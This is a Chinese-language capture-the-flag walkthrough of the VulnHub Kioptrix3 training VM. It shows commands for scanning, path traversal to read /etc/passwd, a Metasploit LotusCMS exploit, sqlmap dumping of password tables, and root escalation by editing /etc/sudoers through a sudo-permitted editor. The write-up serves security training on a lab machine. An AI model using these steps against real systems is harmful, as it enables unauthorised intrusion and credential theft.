---
title: VulnHub-Kioptrix3
---

# VulnHub-Kioptrix3

## 靶机信息

### 靶机介绍

这个挑战面向初学者。然而它是不同的。添加了更多步骤，并且需要新技能。仍然是初学者的领域，我必须补充。与其他方法一样，有不止一种方法可以“pwn”这个方法。有容易也没有那么容易。请记住……“容易”或“困难”的感觉总是与自己的技能水平有关。我从来没有说过这些事情特别困难或困难，但我们都需要从某个地方开始。让我告诉你，制作这些易受攻击的虚拟机并不像看起来那么容易……

### 下载链接

[https://download.vulnhub.com/kioptrix/KVM3.rar](https://download.vulnhub.com/kioptrix/KVM3.rar)

### 运行环境

本靶机提供了`VMware`的镜像，从上面的链接下载之后解压，运行`vmx`文件即可

靶机：可设置为NAT
攻击机：Kali 2021.1、windows 11

### 目标

get-root

## 信息收集

目标发现以及端口服务识别

```shell
#确定目标ip
arp-scan -l
#端口扫描以及服务识别
nmap -A 192.168.160.131
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(33).png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(34).png)

分析扫描结果，发现开启了22和80端口，分别对应ssh服务以及web服务（http）。

```
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
    OS details: Linux 2.6.9 - 2.6.33
```

访问首页

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3-1.png)

### 目录扫描

```shell
dirb 192.168.160.131
```

发现`/phpmyadmin`目录，访问

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(35).png)

发现后台登录页面`/index.php?system=Admin`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(36).png)

观察发现该网站cms为`Lotus CMS`。

## 漏洞挖掘

### 文件包含测试

访问80端口上的WEB服务。发现url中有点问题

```http
http://192.168.160.131/index.php?system=Blog
```

尝试`system=../../../../../etc/passwd`无反应

尝试%00.截断，成功读取/etc/passwd

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(37).png)

但是没有文件上传点，先放着

通过前面的探测，发现目标`cms`为`Lotuscms`

kali查询相关可利用漏洞信息

```shell
searchsploit LotusCMS
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(41).png)

成功查询到相关漏洞

直接msf一把嗦

```shell
#调用模块
use exploit/multi/http/lcms_php_exec
#查看载荷
show options
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(42).png)

设置载荷，成功拿到shell

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(43).png)

## 提权

查看相关文件

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(44).png)

获取交互shell

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

进入gallery目录

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(45).png)

依此探测，发现`gconfig.php`配置文件，`cat`读配置文件![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(46).png)

成功发现数据库账户和密码`root:fuckeyou`

尝试登录上面目录扫描发现的phpmyadmin,成功登录

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(47).png)

打开dev_accounts这张表发现用户名和密码

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(48).png)

破解MD5值后得到密码

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(49).png)

```shell
dreg password:Mast3r
loneferret password: starwars
```

使用ssh用户登录，尝试之后发现`dreg`限制了该用户的访问

然后尝试`loneferret`用户登录

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(50).png)

发现有个公司政策文件，查看

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(51).png)

使用后，发现报错，google一下

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(52).png)

发现

> ht是一个文本编辑器，我们可以在里面修改文件得到权限

```shell
只需在终端，即可中使用它export TERM=xterm
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(53).png)

让我们再次运行`sudo ht`命令

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(54).png)

使用sudo ht命令之后，按F3进行操作，打开/etc/sudoers

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(55).png)

在loneferret末尾追加/bin/bash，保存退出3,ctrl+z

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(3).jpg)

使用sudo -l查看现在可以使用/bin/bash，执行命令sudo /bin/bash命令得到root权限

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(8).png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(9).png)

到这里就结束了吗？哦不，我们尝试另一种方法（手动狗头）

## 方法二：sql注入

查看官方提示

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(39).png)

按照提示，编辑/etc/hosts

将目标IP指向图库域名

192.168.160.131 kioptrix3.com

浏览器访问，然后我点击了`now`超链接并被重定向到图库页面。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(1).png)

尝试sql注入，启动sqlmap,跑了半天无结果

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(10).png)

单击home，尝试sqlmap，依然无结果，再次探测其他的超链接子页面

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(11).png)

进到`Ligoat Press Room`，依旧没啥反应，但是这里发现了个调节选项，这里我选择了Photo id(看到id就蠢蠢欲动)

再次使用sqlmap

```python
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(12).png)

这一次，sqlmap确定id参数可能是可注入的，并且后端数据库似乎是MySQL。

继续确定存在的数据库

```python
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -dbs
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(13).png)

查看gallery数据库下的表

```python
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery --tables
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(14).png)

查看表中的数据

```python
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery -T dev_accounts --dump
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/VulnHub%20-Kioptrix3%20(15).png)

成功获取用户名和密码，后面的提权步骤和上面的一样，就不再赘述

至此，靶机渗透结束。

